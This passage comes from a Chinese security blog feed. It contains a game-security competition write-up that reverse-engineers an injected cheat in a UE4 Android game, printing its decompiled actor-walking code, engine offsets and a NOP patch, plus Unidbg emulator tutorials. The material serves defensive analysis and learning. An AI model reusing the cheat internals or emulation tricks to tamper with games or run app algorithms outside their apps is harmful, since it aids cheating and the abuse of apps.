alt="image-20250808113922335"></p><p>这就好比拿着上海地图在杭州开车，怎么能不出错呢？因此不管使用真实 maps 还是 fakeMaps，都可以解决一些问题，但又会遭遇另一些问题。</p><p>在理论上，建议遇到对 maps 的访问，就对这部分逻辑做算法分析，完全确定其访问意图，然后反向构造合适的 maps 予以返回。</p><p>在实践上，可能没法总这么干，因为太费事了，那么建议优先使用真实 maps，如果出现内存异常（这意味着样本在基于真实 maps 做内存访问），就使用fakeMaps。</p><h3 id="三、参考"><a href="#三、参考" class="headerlink" title="三、参考"></a>三、参考</h3><p>[Unidbg 中处理文件访问（二）](<a href="https://www.yuque.com/lilac-2hqvv/lfssh8/tadqng#">https://www.yuque.com/lilac-2hqvv/lfssh8/tadqng?#</a> 《Unidbg 中处理文件访问（二）》)</p>]]></content>
      
      
      <categories>
          
          <category> Unidbg学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unidbg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025第十届游戏安全竞赛-初赛-安卓客户端安全</title>
      <link href="/2025/07/23/2025%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B-%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
      <url>/2025/07/23/2025%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B-%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="2025第十届游戏安全竞赛-初赛-安卓客户端安全"><a href="#2025第十届游戏安全竞赛-初赛-安卓客户端安全" class="headerlink" title="2025第十届游戏安全竞赛-初赛-安卓客户端安全"></a>2025第十届游戏安全竞赛-初赛-安卓客户端安全</h1><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>启动游戏，可以明显发现游戏存在加速、自瞄、透视等问题。同时看 apk 图标也可知这是用虚幻引擎写的。那么首先先判断虚幻引擎版本，可以直接在 <strong>AndroidManifest.xml</strong> 中找到 <strong>UE4.27</strong> 。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250723100202404.png" alt="image-20250723100202404"></p><p>对所有 so 文件进行分析。首先用偷懒的方法，将所有文件通过 <strong><a href="https://www.virustotal.com/gui/home/upload">Virustotal</a></strong> 计算一下 hash 查看上次上传时间可知，除 libUE4.so 和 libGame.so 都曾经上传过，是标准库，可以不用看，那么就分析这两个文件就好了 。</p><p>参考<a href="https://www.cnblogs.com/revercc/p/17641855.html">文章</a>，分别找到libUE4.so中三个核心参数的偏移</p><blockquote><p>GWorld 0xAFAC398<br>GName 0xADF07C0<br>GUObject 0xAE34A98</p></blockquote><p>然后使用<a href="https://github.com/revercc/UE4Dumper">UE4Dumper</a>对SDK进行提取，再进一步分析</p><h3 id="二、开始"><a href="#二、开始" class="headerlink" title="二、开始"></a>二、开始</h3><p>对 libGame.so 进行分析，可以看到该文件对函数使用了控制流平坦化混淆，利用 IDA 的插件 D-810 即可有效去除混淆进行分析。留意到有几个异或函数对字符串进行了加密，直接手动解出来并进行标注。</p><p>这个 so 文件通过 .<strong>init_array</strong> 调用函数，通过 <strong>pthread_create</strong> 创建新线程，在 <strong>0x1B9C</strong> 通过 <strong>&#x2F;proc&#x2F;self&#x2F;maps</strong> 等方法获取 <strong>libUE4.so</strong> 的基址，然后在下面通过基址 + 偏移计算得到 UE4 中关键参数的地址。</p><pre><code class="language-c">void __fastcall sub_1B9C(__int64 a1)&#123;  int n19629; // w8  __int64 *v2; // x8  int n18756; // w8  __int64 *v4; // x8  int n26308; // w8  int n11323; // w8  int n22929; // w8  int n2306; // w8  int n28745; // w8  int n26777; // w8  int n4031; // w8  __int64 *v12; // x9  int n22355; // w8  __int64 *v14; // x9  _BYTE v15[4]; // [xsp+0h] [xbp-150h] BYREF  int n15350_1; // [xsp+4h] [xbp-14Ch]  __int64 *v17; // [xsp+8h] [xbp-148h]  __int64 v18; // [xsp+10h] [xbp-140h]  int n15350; // [xsp+1Ch] [xbp-134h]  unsigned __int64 *v20; // [xsp+20h] [xbp-130h]  unsigned int *v21; // [xsp+28h] [xbp-128h]  unsigned int *v22; // [xsp+30h] [xbp-120h]  _BYTE *v23; // [xsp+38h] [xbp-118h]  _QWORD *v24; // [xsp+40h] [xbp-110h]  __int64 *v25; // [xsp+48h] [xbp-108h]  int v26; // [xsp+50h] [xbp-100h]  bool v27; // [xsp+57h] [xbp-F9h]  __int64 ____; // [xsp+58h] [xbp-F8h]  bool v29; // [xsp+67h] [xbp-E9h]  __int64 baseAddr; // [xsp+68h] [xbp-E8h]  __int64 *GWorld_Addr; // [xsp+70h] [xbp-E0h]  __int64 GWorld_Addr1; // [xsp+78h] [xbp-D8h]  __int64 level; // [xsp+80h] [xbp-D0h]  bool v34; // [xsp+8Fh] [xbp-C1h]  unsigned __int64 n0x10000; // [xsp+90h] [xbp-C0h]  bool v36; // [xsp+9Fh] [xbp-B1h]  __int64 v37; // [xsp+A0h] [xbp-B0h] BYREF  unsigned int i; // [xsp+B4h] [xbp-9Ch]  unsigned int actorsCount; // [xsp+B8h] [xbp-98h]  bool v40; // [xsp+BFh] [xbp-91h]  unsigned int v41; // [xsp+CCh] [xbp-84h]  bool v42; // [xsp+DFh] [xbp-71h]  int v43; // [xsp+F0h] [xbp-60h]  bool v44; // [xsp+F7h] [xbp-59h]  unsigned int v45; // [xsp+120h] [xbp-30h]  unsigned int v46; // [xsp+124h] [xbp-2Ch]  __int64 v47; // [xsp+148h] [xbp-8h]  v17 = &amp;v37;  v18 = a1;  v47 = *(_ReadStatusReg(TPIDR_EL0) + 0x28);  v20 = &amp;v15[-16];  n15350 = 15350;  while ( 1 )  &#123;    while ( 1 )    &#123;      n15350_1 = n15350;      if ( n15350 != 1150 )        break;      *v22 = v46;      n15350 = 16941;    &#125;    switch ( n15350_1 )    &#123;      case 2082:        if ( v36 )          n22929 = 22929;        else          n22929 = 16541;        n15350 = n22929;        break;      case 2306:        v17[4] = *v20;        v41 = *v22;        n15350 = 31673;        break;      case 3430:        usleep(0x2710u);        n15350 = 31107;        break;      case 3548:        if ( v27 )          n19629 = 19629;        else          n19629 = 3430;        n15350 = n19629;        break;      case 4031:        n15350 = 12052;        break;      case 4639:        n15350 = 29658;        break;      case 4833:        v17[1] = *v17;                          // 拿到 ActorsCount 指针        n15350 = 31115;        break;      case 4966:        GWorld_Addr1 = *GWorld_Addr;        n15350 = 7376;        break;      case 5021:        if ( v42 )          n28745 = 28745;        else          n28745 = 26924;        n15350 = n28745;        break;      case 5097:        if ( v44 )          n4031 = 4031;        else          n4031 = 16512;        n15350 = n4031;        break;      case 5537:        *v20 = *(v17[17] + 0x98);               // Actors        n15350 = 21538;        break;      case 5829:        if ( *v24 - v17[19] == 0xA63BE28 )          n26777 = 26777;        else          n26777 = 4031;        n15350 = n26777;        break;      case 6270:        *v24 = v17[9];        n15350 = 5829;        break;      case 7376:        v4 = v17;        v17[18] = GWorld_Addr1;        if ( v4[18] &gt;= 0x10000 )          n26308 = 26308;        else          n26308 = 13931;        n15350 = n26308;        break;      case 9161:        if ( v17[12] &gt;= 0x10000 )          n22355 = 22355;        else          n22355 = 18636;        n15350 = n22355;        break;      case 9930:        v40 = i &lt; actorsCount;        n15350 = 13977;        break;      case 11323:        n15350 = 31101;        break;      case 11840:        GWorld_Addr = (baseAddr + 0xAFAC398);   // GWorld        n15350 = 4966;        break;      case 12052:        v45 = *v22;        n15350 = 27350;        break;      case 12623:        ____ = sub_B80(0xFFFFFFFF, &amp;unk_B658);  // 获取基址        n15350 = 24084;        break;      case 13290:        v12 = v17;        *v25 = *(*v23 + 0x288LL);        v12[12] = *v25;        n15350 = 9161;        break;      case 13931:        n15350 = 31101;        break;      case 13966:        n15350 = 3430;        break;      case 13977:        if ( v40 )          n2306 = 2306;        else          n2306 = 21724;        n15350 = n2306;        break;      case 15006:        v24 = v15;        v25 = &amp;v15[-16];        v17[20] = v18;        n15350 = 31101;        break;      case 15350:        v21 = v15;        v22 = v15;        v23 = &amp;v15[-16];        n15350 = 15006;        break;      case 15573:        v44 = v43 != 0;        n15350 = 5097;        break;      case 15574:        *(v17[15] + 0x18C) = 0x4E6E6B28;        dword_B61C = 1;        n15350 = 21724;        break;      case 16118:        v36 = n0x10000 &lt; 0x10000;        n15350 = 2082;        break;      case 16512:        v17[11] = *v23 + 0x538LL;        n15350 = 23986;        break;      case 16541:        *v17 = v17[17] + 0xA0;                  // ActorsCount        n15350 = 4833;        break;      case 16941:        n15350 = 29658;        break;      case 16944:        v17[17] = level;        n15350 = 32439;        break;      case 18636:        n15350 = 12052;        break;      case 18756:        baseAddr = v17[19];        n15350 = 11840;        break;      case 19072:        v17[9] = *v17[8];        n15350 = 6270;        break;      case 19629:        sub_30A0(&amp;unk_B658, &amp;unk_890);          // 异或解出来是 libUE4.so        n15350 = 12623;        break;      case 19954:        if ( v29 )          n18756 = 18756;        else          n18756 = 13966;        n15350 = n18756;        break;      case 21538:        n0x10000 = *v20;        n15350 = 16118;        break;      case 21724:        n15350 = 13966;        break;      case 22355:        v17[13] = *v25 + 0x1A0;        n15350 = 24767;        break;      case 22386:        *v23 = *(v17[4] + 8 * v17[6]);          // actor = actors[i]        v42 = *v23 &lt; 0x10000u;        n15350 = 5021;        break;      case 22704:        actorsCount = *v21;        n15350 = 9930;        break;      case 22929:        n15350 = 31101;        break;      case 23655:        v14 = v17;        *v17[14] = 0x4E6E6B28;        v14[15] = *v25;        n15350 = 15574;        break;      case 23986:        *v17[11] = 0;        n15350 = 13290;        break;      case 24084:        v2 = v17;        v17[19] = ____;        v29 = v2[19] &gt; 0x10000;        n15350 = 19954;        break;      case 24393:        v27 = v26 == 1;        n15350 = 3548;        break;      case 24626:        if ( v34 )          n11323 = 11323;        else          n11323 = 5537;        n15350 = n11323;        break;      case 24767:        v17[14] = v17[13];        n15350 = 23655;        break;      case 26308:        level = *(v17[18] + 0x30);              // level        n15350 = 16944;        break;      case 26777:        v43 = dword_B61C;        n15350 = 15573;        break;      case 26924:        v17[8] = *v23;        n15350 = 19072;        break;      case 27350:        v46 = v45 + 1;        n15350 = 1150;        break;      case 28745:        n15350 = 12052;        break;      case 29658:        i = *v22;        n15350 = 22704;        break;      case 31101:        v26 = dword_B618;        n15350 = 24393;        break;      case 31107:        n15350 = 31101;        break;      case 31115:        *v21 = *v17[1];                         // 拿到 ActorsCount 的值        *v22 = 0;        n15350 = 4639;        break;      case 31673:        v17[6] = v41;        n15350 = 22386;        break;      case 32439:        v34 = v17[17] &lt; 0x10000;        n15350 = 24626;        break;    &#125;  &#125;&#125;</code></pre><p>在下面通过遍历 <strong>Actors</strong> 中的元素，找到所要的 <strong>Actor</strong> 后，通过偏移计算找到对应要修改的参数</p><pre><code class="language-c">case 11840:    GWorld_Addr = (baseAddr + 0xAFAC398);   // GWorld    n15350 = 4966;case 4966:    GWorld_Addr1 = *GWorld_Addr;    n15350 = 7376;case 7376:    v17[18] = GWorld_Addr1;    if ( v17[18] &gt;= 0x10000 )        n15350 = 26308;    else        n15350 = 13931;case 26308:    level = *(v17[18] + 0x30);              // 获取 Level    n15350 = 16944;case 16944:    v17[17] = level;    n15350 = 32439;case 32439:    v34 = v17[17] &lt; 0x10000;    n15350 = 24626;case 24626:    if ( v34 )        n15350 = 11323;    else        n15350 = 5537;case 5537:    *v20 = *(v17[17] + 0x98);               // Actors: TArray&lt;AActor*&gt;*    n15350 = 21538;case 21538:    n0x10000 = *v20;                        // TArray.data    n15350 = 16118;case 16118:    v36 = n0x10000 &lt; 0x10000;    n15350 = 2082;case 2082:    if ( v36 )        n15350 = 16541;    else        n15350 = 22929;case 16541:    *v17 = v17[17] + 0xA0;                  // ActorsCount    n15350 = 4833;case 4833:    v17[1] = *v17;                          // 拿到 ActorsCount 指针    n15350 = 31115;case 31115:    *v21 = *v17[1];                         // 拿到 ActorsCount 的值    *v22 = 0;    n15350 = 4639;case 4639:    n15350 = 29658;case 29658:    v38 = *v22;                             // 当前索引 i    n15350 = 22704;case 22704:    v39 = *v21;                             // ActorsCount    n15350 = 9930;case 9930:    v40 = v38 &lt; v39;                        // i &lt; count ?    n15350 = 13977;case 13977:    if ( v40 )        n15350 = 2306;                      // 是，继续遍历    else        n15350 = 21724;case 2306:    v17[4] = *v20;                          // TArray&lt;AActor*&gt;.data    v41 = *v22;                             // i    n15350 = 31673;case 31673:    v17[6] = v41;    n15350 = 22386;case 22386:    *v23 = *(v17[4] + 8 * v17[6]);          // actor = actors[i]    v42 = *v23 &lt; 0x10000u;    n15350 = 5021;case 5021:    if ( v42 )        n15350 = 28745;    else        n15350 = 26924;case 28745:    n15350 = 12052;case 12052:    v45 = *v22;    n15350 = 27350;case 27350:    v46 = v45 + 1;    n15350 = 1150;case 1150:    *v22 = v46;                             // i++    n15350 = 16941;case 16941:    n15350 = 29658;                         // 继续循环</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250723145621085.png" alt="image-20250723145621085"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250723145632530.png" alt="image-20250723145632530"></p><h4 id="异常点-1"><a href="#异常点-1" class="headerlink" title="异常点 1"></a>异常点 1</h4><p>根据偏移查找SDK可以得知是开枪时的后坐力，后续通过Frida修改为其他值也可以进一步验证</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250723150117275.png" alt="image-20250723150117275"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250723150239782.png" alt="image-20250723150239782"></p><h4 id="异常点-2、3"><a href="#异常点-2、3" class="headerlink" title="异常点 2、3"></a>异常点 2、3</h4><p>同理，根据偏移去查找对应的参数，可知是人物的速度和加速度<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250723150720666.png" alt="image-20250723150720666"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250723150902498.png" alt="image-20250723150902498"></p><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>这里选择将三个地方的 <strong>STR</strong> 赋值汇编 NOP 掉，然后patch，使用 MT 管理器替换 so 文件 将 apk 重新打包签名，即可修复<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250723151132269.png" alt="image-20250723151132269"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250723151425313.png" alt="image-20250723151425313"></p><p>自瞄这个异常点也是需要先去分析 SDK ，然后用 Frida 去进行 Hook 验证猜想，接着再去观察开枪和不开枪时堆栈的区别，最后定位到某一行代码，nop掉，就可以修复了。</p><p>还有两个异常点，子弹乱飞，渲染问题。由于没接触过虚幻引擎这方面的开发，修复不下去了…</p>]]></content>
      
      
      <categories>
          
          <category> Android-RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> WritesUp </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>创建模拟器和加载模块</title>
      <link href="/2025/07/19/%E5%88%9B%E5%BB%BA%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%92%8C%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97/"/>
      <url>/2025/07/19/%E5%88%9B%E5%BB%BA%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%92%8C%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="创建模拟器和加载模块"><a href="#创建模拟器和加载模块" class="headerlink" title="创建模拟器和加载模块"></a>创建模拟器和加载模块</h1><h3 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h3><p>本篇讨论两个过程中涉及到的知识和用法</p><h3 id="二、创建模拟器"><a href="#二、创建模拟器" class="headerlink" title="二、创建模拟器"></a>二、创建模拟器</h3><p>在创建模拟器时，我们通过建造者模式对模拟器的方方面面进行配置。</p><pre><code class="language-Java">private static AndroidEmulator createARMEmulator() &#123;    return AndroidEmulatorBuilder.for32Bit()            .setProcessName(&quot;com.sun.jna&quot;)            .addBackendFactory(new DynarmicFactory(true))            .build();&#125;</code></pre><h4 id="2-1-位数与架构"><a href="#2-1-位数与架构" class="headerlink" title="2.1 位数与架构"></a>2.1 位数与架构</h4><p>Unidbg 不支持 X86 和 Mips架构，所以 <strong>for32Bit</strong> 和 <strong>for64Bit</strong> 意味着是 ARM32 和 ARM64.</p><pre><code class="language-Java">if (emulator.is32Bit() &amp;&amp; elfFile.arch != ElfFile.ARCH_ARM) &#123;    throw new ElfException(&quot;Must be ARM arch.&quot;);&#125;if (emulator.is64Bit() &amp;&amp; elfFile.arch != ElfFile.ARCH_AARCH64) &#123;    throw new ElfException(&quot;Must be ARM64 arch.&quot;);&#125;</code></pre><p>如果样本既提供了 ARM32，也提供了 ARM64 的动态库，那么你可以根据个人喜好做选择。从Unidbg 的角度讲，有两个因素你可以考虑</p><ol><li>是执行速度，ARM64 相比 ARE32 会快 10% 上下。</li><li>是完善程度，在过去几年，出于节省包体积、兼容适配等原因，绝大多数样本只提供 ARM32 的动态库，导致 Unidbg 对 ARM32 的完善程度更好一些，这体现在 JNI 等多方面。</li></ol><p>面向未来建议选 ARM64 ，面向当下选 ARM32。</p><h4 id="2-2-进程名"><a href="#2-2-进程名" class="headerlink" title="2.2 进程名"></a>2.2 进程名</h4><p>setProcessName 用于设置 App 进程名，很多人会忽略这一设置，但最好设置一下，否则会带来风险。因为样本可以在代码中通过 getProgname 函数获取进程名。</p><pre><code class="language-c">// function in libc.so__int64 getprogname()&#123;  return _progname;&#125;</code></pre><p>如果通过 setProcessName 设置了进程名，那么getProgname 会返回你所设置的进程名，而如果不设置进程名，Unidbg 会设置进程名为自身，这可不是很妙。</p><pre><code class="language-Java">this.processName = processName == null ? &quot;unidbg&quot; : processName;</code></pre><h4 id="2-3-后端"><a href="#2-3-后端" class="headerlink" title="2.3 后端"></a>2.3 后端</h4><p><strong>addBackendFactory</strong> 用于设置后端执行引擎，一般计算机的结构如下图所示。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/1663811081116-b380d5b8-bc2f-470b-8c7c-04d644ac8c2b.png" alt="image.png"></p><p>Unidbg 中结构如下<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/1663811101807-2f1e0030-eb9a-4169-ac60-cdacc1a7b442.png" alt="image.png"></p><p>Unidbg 扮演的角色就是操作系统，它是一个微型、有限的 Linux 操作系统模拟器。</p><p>Backend 扮演的角色是处理器，承担模拟执行机器指令的任务。<strong>addBackendFactory</strong> 用于设置使用哪一个后端，因为 Unidbg 支持多个 Backend。Backend 的选择直接影响着 Unidbg 的能力边界和模拟执行的效率，所以这部分内容很重要，我们需要多做一些了解。</p><p>Unidbg 目前支持五个 Backend，分别是 Unicorn、Unicorn2、Dynarmic、Hypervisor、KVM。如果不添加BackendFactory，默认使用 Unicorn Backend，代码逻辑如下</p><pre><code class="language-Java">public static Backend createBackend(Emulator&lt;?&gt; emulator, boolean is64Bit, Collection&lt;BackendFactory&gt; backendFactories) &#123;    if (backendFactories != null) &#123;        for (BackendFactory factory : backendFactories) &#123;            Backend backend = factory.newBackend(emulator, is64Bit);            if (backend != null) &#123;                return backend;            &#125;        &#125;    &#125;    // 默认使用 Unicorn后端    return new UnicornBackend(emulator, is64Bit);&#125;</code></pre><p>​      事实上，Unicorn 也是 Unidbg 早先唯一的后端，Unidbg 这一命名甚至都可能是 Unicorn Debugger 的缩写。下面我们简单讨论 Unidbg Backend 的发展历史。</p><p>​       Unicorn 作为这些年最炙手可热的 CPU 模拟器，当之无愧是所有后端中功能最全面也是最强大的那个，在 Unicorn2 发布后，这一称号就到了 Unicorn2 头上。</p><p>​        那么为什么 Unidbg 要引入其他后端？背后原因也很简单——Unicorn 执行速度太慢了。Unidbg 的设计初衷是利用 Unicorn 所提供的各种强大 Hook，辅助和加速 Android Native 算法分析，那么执行百万行汇编耗时 1s 还是 1ms 完全无足轻重，这个时候 Unidbg 的主要用处就是调试 SO，没有人在意调试器的速度。</p><p>​        但在 Unidbg 开源并得到广泛关注后，这一情况发生了改变。Unidbg 可以很好的模拟执行目标函数，不依赖于真实设备，参数和设备信息可以轻松配置等特征，吸引了大批的爬虫乃至黑灰产从业人员，他们将 Unidbg 单纯用在跑算法上。相比基于真机的各种远程调用，既不需要购买大量真机&#x2F;云手机，也不需要购买一键新机的软件，十分好用。</p><p>​        这一用途很快成为 Unidbg 的最主要用途，那么相比于基于真机 RPC 的各种方案，Unidbg 的执行速度就成了最大的短板，快和慢的源头就是底层的指令执行引擎。Unicorn Backend 执行指令实在太慢了，甚至都比不过 Android 4.0 的老设备，这意味着在模拟执行复杂函数和流程时，单次执行耗时在数秒以上，这严重影响了 Unidbg 在这一用途上的使用。</p><p>​        因此 Unidbg 引入了 <a href="https://github.com/merryhime/dynarmic">Dynarmic</a> 作为可选后端，它是另一款 CPU 模拟器，在执行速度上比 Unicorn 快了不止一个数量级。但它在可以对比的所有其他维度上都比 Unicorn 弱，比如不支持各种各样的 Hook，比如支持指令的范围、架构的广度等等。使用 Dynarmic 引擎，Unidbg 在 debugger 上的能力十不余一，辅助算法分析的能力大大降低。</p><p>​       如果你使用 Unidbg 的意图是算法还原，那么建议使用 Unicorn2 后端。</p><pre><code class="language-Java">emulator = AndroidEmulatorBuilder.for32Bit()        .addBackendFactory(new Unicorn2Factory(false))        .setProcessName(&quot;test&quot;)        .build();</code></pre><p>​        各种 BackendFactory 的构造方法都要传入<strong>fallbackUnicorn</strong>参数，它表示如果这个后端创建失败时如何处理。</p><pre><code class="language-Java">private Backend newBackend(Emulator&lt;?&gt; emulator, boolean is64Bit) &#123;    try &#123;        return newBackendInternal(emulator, is64Bit);    &#125; catch (Throwable e) &#123;        if (fallbackUnicorn) &#123;            return null;        &#125; else &#123;            throw e;        &#125;    &#125;&#125;</code></pre><p>​        如果设置为 false，那么 backend 创建失败时直接报错；设置为 true，返回 null，最终使用默认的 Unicorn Backend。</p><p>​        相比较 Unicorn 后端，Unidbg 基于 Unicorn2 后端设计和处理了多线程的相关逻辑，因此在 Unicorn 和 Unicorn2 之间，应该选择 Unicorn 2。</p><p>​        如果你使用 Unidbg 的意图是模拟执行，替代 RPC，那么你仍然应该先试 Unicorn2 后端，因为 Unicorn2 在模拟执行指令上的能力更强，如果 Unicorn2 最终能顺利跑通、跑出预期结果，再切换为 Dynarmic 看是否也能处理成功，如果 Unicorn2 跑不通，那么 Dynarmic 引擎也必然无法成功。需要强调的是，使用 Dynarmic 引擎时，不可使用基于 Unicorn 的 各种 Hook，而应该用内置适配的 HookZz、xHook 等框架。</p><pre><code class="language-java">emulator = AndroidEmulatorBuilder.for32Bit()    //.addBackendFactory(new Unicorn2Factory(false))    .addBackendFactory(new DynarmicFactory(true))    .setProcessName(&quot;test&quot;)    .build();</code></pre><p>​        关于执行速度和应用实践，这里再多谈一些。首先，Unicorn 和 Unicorn2 在模拟执行速度上差异不大，但因为多线程以及用新不用旧的原因，我们一般使用 Unicorn2。其次，Unicorn、Dynarmic、真机这三者在执行速度上差异有多大，读者应该有一个直观的感受。Unicorn 最慢，Dynarmic 比 Unicorn 快 50 - 100 倍，真机比 Dynarmic 快 5 - 30 倍，因此测试机性能差异很大。最后，为了提高效率，光用 Dynarmic 是不够的，还会搭配 unidbg-boot-server。</p><p>​       说完 Unicorn&#x2F;Unicorn2&#x2F;Dynarmic 这三个 Backend，我们再简单介绍其他两个。KVM 和 Hypervisor 都是虚拟化而非模拟执行方案，所以对宿主机有较高要求，KVM 可用于 Raspberry Pi B4 等环境 ，速度快。Hypervisor 是 Mac M1上的虚拟化方案，是 Unidbg 上最快的后端。KVM 和 Hypervisor 都很快很快，但受制于宿主机设备限制，在 Unidbg 实际使用中不多见。</p><h4 id="2-4根目录"><a href="#2-4根目录" class="headerlink" title="2.4根目录"></a>2.4根目录</h4><p><strong>setRootDir</strong> 用于设置虚拟文件系统的根目录，在作用上它等价于 Android 的根目录</p><pre><code class="language-Java">emulator = AndroidEmulatorBuilder.for32Bit()        .setProcessName(executable.getName())        .setRootDir(new File(&quot;target/rootfs&quot;))        .addBackendFactory(new DynarmicFactory(true))        .build();</code></pre><p>​       如果你认为目标函数可能会做文件访问或读写操作，那么建议主动设置根目录。因为如果不加以设置，Unidbg 会在本机某个临时目录下创建根目录，在将项目迁移到其他电脑上时就比较麻烦。我们一般将根目录设置为 target&#x2F;rootfs 这个相对路径，使得潜在的文件依赖环境在当前 Unidbg 项目里。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250719155217809.png" alt="image-20250719155217809"></p><h4 id="2-5-PID"><a href="#2-5-PID" class="headerlink" title="2.5 PID"></a>2.5 PID</h4><p>在 Unidbg 中，进程的 pid 被默认设置为当前的 JVM 的 ID。约束其不大于 0x7FFF，这是一个相对老旧的规定，但无关痛痒。</p><pre><code class="language-Java">String name = ManagementFactory.getRuntimeMXBean().getName();String pid = name.split(&quot;@&quot;)[0];this.pid = Integer.parseInt(pid) &amp; 0x7fff;</code></pre><p>理论上，Unidbg 最好在初始化时提供一个 <strong>setPid</strong> 方法，让使用者可以设置 pid，这会有助于处理进程相关的文件访问，但目前 Unidbg 并没有这么做。</p><h4 id="2-6-开启多线程"><a href="#2-6-开启多线程" class="headerlink" title="2.6 开启多线程"></a>2.6 开启多线程</h4><p>在大多数情况下，开启多线程可以更好的处理程序逻辑。Unidbg 只在 Unicorn2 Backend 上实现了相对完善的多线程处理逻辑，除了将 Backend 设置为 Unicorn2 外，你还需要像下面代码这样，开启调度以及设置多少行切换一次</p><pre><code class="language-Java">emulator = AndroidEmulatorBuilder.for32Bit()        .addBackendFactory(new Unicorn2Factory(false))        .setProcessName(&quot;test&quot;)        .build();// 设置执行多少条指令切换一次线程emulator.getBackend().registerEmuCountHook(10000);// 开启日志emulator.getSyscallHandler().setVerbose(true);// 开启线程调度器emulator.getSyscallHandler().setEnableThreadDispatcher(true);</code></pre><h3 id="三、加载模块"><a href="#三、加载模块" class="headerlink" title="三、加载模块"></a>三、加载模块</h3><h4 id="3-1-加载模块"><a href="#3-1-加载模块" class="headerlink" title="3.1 加载模块"></a>3.1 加载模块</h4><p>Unidbg 在创建虚拟机对象的时候，可以传入甚至是建议传入 apk 文件，</p><pre><code class="language-Java">//创建虚拟机VM dalvikVM = emulator.createDalvikVM();//创建虚拟机并指定APK文件VM dalvikVM = emulator.createDalvikVM(new File(&quot;apk file path&quot;));</code></pre><p>这一行让很多人误以为 Unidbg 不是一个 so 模拟器，而是一个 APK 模拟器，就像雷电或者夜神模拟器。实际上， Unidbg 加载 apk 并非要去执行 dex 甚至 apk 这样的大事，相反，它只是在做一些小而美的事。</p><p>一是解析 apk 信息，减少使用者在补 JNI 环境上的工作量。Unidbg 会解析版本名、版本号、包名等信息，如果样本 JNI 访问和获取这些信息，Unidbg 会替我们处理，不需要我们烦心。</p><pre><code class="language-Java">// versionNameif (&quot;android/content/pm/PackageInfo-&gt;versionName:Ljava/lang/String;&quot;.equals(signature) &amp;&amp;        dvmObject instanceof PackageInfo) &#123;    PackageInfo packageInfo = (PackageInfo) dvmObject;    if (packageInfo.getPackageName().equals(vm.getPackageName())) &#123;        String versionName = vm.getVersionName();        if (versionName != null) &#123;            return new StringObject(vm, versionName);        &#125;    &#125;&#125;// versionCodeif (&quot;android/content/pm/PackageInfo-&gt;versionCode:I&quot;.equals(signature)) &#123;    return (int) vm.getVersionCode();&#125;// packageNamecase &quot;android/app/Application-&gt;getPackageName()Ljava/lang/String;&quot;:case &quot;android/content/ContextWrapper-&gt;getPackageName()Ljava/lang/String;&quot;:case &quot;android/content/Context-&gt;getPackageName()Ljava/lang/String;&quot;: &#123;    String packageName = vm.getPackageName();    if (packageName != null) &#123;        return new StringObject(vm, packageName);    &#125;    break;&#125;</code></pre><p>进一步，Unidbg 还会解析 APK 签名，处理签名校验相关的 JNI 调用。</p><pre><code class="language-Java">@Overridepublic CertificateMeta[] getSignatures() &#123;    if (signatures != null) &#123;        return signatures;    &#125;    try (net.dongliu.apk.parser.ApkFile apkFile = new net.dongliu.apk.parser.ApkFile(this.apkFile)) &#123;        List&lt;CertificateMeta&gt; signatures = new ArrayList&lt;&gt;(10);        for (ApkSigner signer : apkFile.getApkSingers()) &#123;            signatures.addAll(signer.getCertificateMetas());        &#125;        this.signatures = signatures.toArray(new CertificateMeta[0]);        return this.signatures;    &#125; catch (IOException | CertificateException e) &#123;        throw new IllegalStateException(e);    &#125;&#125;</code></pre><p>处理 JNI 中获取签名信息的 API (只举例一处)</p><pre><code class="language-Java">if (&quot;android/content/pm/PackageInfo-&gt;signatures:[Landroid/content/pm/Signature;&quot;.equals(signature) &amp;&amp;        dvmObject instanceof PackageInfo) &#123;    PackageInfo packageInfo = (PackageInfo) dvmObject;    if (packageInfo.getPackageName().equals(vm.getPackageName())) &#123;        CertificateMeta[] metas = vm.getSignatures();        if (metas != null) &#123;            Signature[] signatures = new Signature[metas.length];            for (int i = 0; i &lt; metas.length; i++) &#123;                signatures[i] = new Signature(vm, metas[i]);            &#125;            return new ArrayObject(signatures);        &#125;    &#125;&#125;</code></pre><p>如果没有加载 apk，这些 JNI 调用就需要我们去补，平添不少工作量。</p><p>二是对资源文件的处理，如果加载了 